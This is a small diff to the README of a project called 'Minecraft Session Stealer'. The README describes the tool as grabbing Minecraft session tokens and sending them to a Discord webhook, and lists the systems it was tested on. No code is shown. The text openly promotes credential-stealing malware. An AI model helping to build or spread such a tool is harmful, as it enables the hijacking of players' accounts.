@@ -1,7 +1,9 @@
 
 # Minecraft Session Stealer - MSS
   An easy way to grab session tokens from Minecraft and send to a Discord webhook.
+  
   Original Inspiration from [wodxgod](https://github.com/wodxgod/Minecraft-Session-Token-Stealer)
+  
   Currently tested on Android, Kali Linux, Ubuntu, Windows 10 and Windows 7. 
 
 -------------------------
